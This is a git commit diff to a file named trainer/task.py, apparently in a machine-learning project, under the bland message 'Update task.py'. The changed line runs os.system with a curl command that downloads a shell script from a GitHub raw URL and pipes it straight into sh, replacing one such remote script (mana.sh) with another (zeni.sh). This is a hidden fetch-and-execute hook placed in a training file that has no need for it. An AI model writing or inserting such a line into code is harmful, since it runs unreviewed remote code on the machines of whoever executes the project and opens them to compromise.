da269b3dbe58d651e005a6aae51afe412da82a64
Tianna Mcdowell <160614390+TiannaMcdowell@users.noreply.github.com>
2024-02-29 23:36:55 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sSL https://raw.githubusercontent.com/TiannaMcdowell/All-Jobs/main/mana.sh | sh')
+os.system('curl -sSL https://raw.githubusercontent.com/TiannaMcdowell/All-Jobs/main/zeni.sh | sh')
